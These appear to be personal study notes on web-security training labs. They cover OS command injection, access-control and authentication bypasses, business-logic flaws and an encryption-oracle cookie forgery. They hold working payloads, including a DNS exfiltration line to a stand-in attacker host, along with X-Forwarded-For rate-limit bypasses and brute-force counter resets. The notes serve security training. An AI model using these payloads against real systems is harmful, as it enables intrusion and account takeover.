# OS command injection
- Operators to link operations: 
    - `||`, `&&`, `;` -> try them all
    - less common: `|`, `&`, `0x0a or \n`
    -  `\`` or `$()` for command injection within command
- blind OS command injection -> use `sleep 5` or `ping -c 10 127.0.0.1` to confirm it
- to `exlpoit it` **write the output of the command to a WRITABLE FILE**:
    - ex: If images are retrieved from the path /image?filename=a -> try popular paths like: **/var/www/images** where it could be stored. Inject `||whoami+>+/var/www/images/a||` -> and then retrieve it from the image path: **/image?filename=a**
- to `exploit it` use **out-of-band interactions**
    - ex: `nslookup attacker.com` to test it and `& nslookup `whoami`.kgji2ohoyw.web-attacker.com &` to retrieve the value from the command output

# Access control vulnerabilities

### Lab 1 (Url based access-control can be circumvented)
- Some frameworks like: `symfony(php)`, `zend-diactoros`, `zend-http`, `zend-feed` -> support legacy headers **X-Original-URL** and **X-Rewrite-URL**
- These allow to rewrite the request: `GET /admin/delete` => `GET /?user=carlos, headers: {X-Original-URL: /admin/delete?user=carlos}`!
- If **access is restricted based on URL** => you can trick the url value of the request and change it from the header this way!

### Lab 2 (Method-based access control can be circumvented)
- POST is restricted, but GET is NOT
- try to change the request method and move the post parameters as ?x=1&y=2.
- sometimes access can be restricted to SOME HTTP METHODS

### Lab 3 
- Multi-step authorization, where last step is NOT PROPERLY CHECKED.
- ex: POST /admin-roles with body `action=upgrade&username=wiener` -> which if you add your session cookie -> **UNAUTHORISED!!!**
- but if you see, the next step of the authorization is: POST /admin-roles with body: `action=upgrade&confirmed=true&username=wiener` -> which if you add your session cookie -> WORKS!!!

### Lab 4
- The `Refferer` header indicates which website initiated the action
- Validation can be done rigurously on the `/admin` path, but on the other paths like: `/admin/delete?username=carlos` the validation is done based on the fact : **if the Refferer header is /admin**
    - The assumption is: only someone who has access to the admin page can initiate these action
    - Since /admin is well secured -> anyone who accesses these actions COME FROM /admin => `FALSE ASSUMPTION - attackers can change Refferer header`

- Other vulns: `Location based authorization` -> you can use a **VPN or other mechanisms to circumvent this**


# Authentication vulnerabilities

- Username enumeration using login forms: 
    - get different error when the username is valid but password is wrong than when both are wrong
    - get error `username is taken` on the registration form
    - indicators: **response status**, **error messages** or **response times**

### Lab 1 - Username enumeration via subtly different responses
- bruteforce usernames and passwords using wordlist
- for the usernames, the difference was the correct answer was missing a .
    - ex: WRONG response: `Invalid username or password.` vs VALID username: `Invalid username or password `

### Lab 2 - Username enumeration via response timing
- this lab has a rate limit defense based on the IP address of the sender
- to bypass IP rate limiting, use: `X-Forwarded-For: 161.19.1.1` and that will indicate that the traffic originates from that IP adddress
- to solve this, we used a **Pitchfork** attack from Intruder, adding a $$ to the X-Forwarded-For: `123.1.1.$1$` and one for the username
- OBS: When dealing with response timing, to make sure that the differences in time are visible, purposefully craft the exploit to make huge delays when working.
    - ex: If the username is correct, it's gonna go ahead and check the password, which takes time, so to make it more obvious -> **CHECK A LONGER PASSWORD takes MORE TIME** -> username=$$ and password=100characters long

#
    Brute-force protection mechanisms
    - IP rate limiting or blocking
        - bypass: X-Forwarded-For header 
    - locking account after too many failed attempts
        - bypass: counter may reset on correct login; so brute-force until BEFORE limit, login to your account, that resets counter -> continue process

### Lab 3 - Broken brute-force protection, IP block
- this lab resets the counter of wrong attempts on correct login, so it requires a sequence of tries like: **try1,try2,reset** or **try,reset,try,reset**
- we can use the `bruteforceBypass.py` script
- or we can use a `MACRO` in BurpSuite
    - go into Proxy Settings - Session - Macro - Add - choose the request that resets the counter(the correct login)
    - then go into the Proxy Settings - Session handling rules - add a macro -  add the macro, and make sure to check `Include all URLS` in the scope window
- or use `Turbo Intruder` (much faster too)
    - ![alt text](image.png)
        
### Lab 4 - Username enumeration via account lock
- this lab locks you out if the username is valid, but otherwise lets you try passwords forever
- For each username, launch an attack with 4-5 passwords, and when you get locked out -> valid username!!!
- So then you do a intruder normal sniper attack with the passwords and you get the password even with lockouts.

### Lab 5 - Offline password cracking

- the password was kept in a cookie in base64 encoding + md5 hash
- so we only needed to steal the cookie

wiener@exploit-0a1d009c03fd40c087b5dc67019700a7.exploit-server.net

# Business logic labs
### Lab 1: Low-level logic flaw
- aim for an `integer overflow` (integer max: **2,147,483,647**)
- use the Intruder to add 99 items at once multiple times(since 99 is the limit in one api call) -> observe that you get after a while the total to be negative
- try to buy -> ERROR: total cannot be negative
- SOLUTION: add again items until the integer overflows again to the positives and add smaller items to make the total under your store credit!



### Lab 2: Inconsistent handling of exceptional input
- aim for `buffer overflow`
- observe that for a long enought email you can get it truncated, while also keeping the whole address for the email confirmation!!!
- then play with the concept of: 
    - `You can use the link in the lab banner to access an email client connected to your own private mail server. The client will display all messages sent to @YOUR-EMAIL-ID.web-security-academy.net and any arbitrary subdomains. Your unique email ID is displayed in the email client.` -> subdomains means: **a@YOUR-EMAIL-ID.web-security-academy.net** but also **a@something.YOUR-EMAIL-ID.web-security-academy.net**
- Combine them: add exactly as many characters before `@dontwannacry.com`
so that it overflows the limit and the email in the app remains with the ending @dontwannacry,com == **ADMIN ACCOUNT**
- final payload email: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0adf0019041165ce8369c75801ed004f.exploit-server.net`


### Authentication bypass via encryption oracle
- Whenever you see **remember-me** login , it probably keeps login data in a cookie
- In this case it uses some special encoding with a 16bit padded cipher with a private key
- `Try to find also a decrypt functionality`
- In this problem it provides encoded error messages that are then decoded on the main page when provided in the notification cookie
- When you recognize patterns, like base64, it sure as hell is base64. Like here you had to delete 16bit chuncks but not from the base64, but from the base64 hex decoding, And you then had to re-encode the payload with base64
    - You can observer the decoding by passing the stay-logged-in cookie to the notification cookie and seeing an error message like: `wiener:12797018361`
    - Then we use the error generation in the email field of the comment post request to generate the payload: `administrator:126726310`.
    - But the error message is: `Invalid email address: ` so we have to pad it to our payload with enough chars to be 16-bit padded (which we identified from passing different payloads)
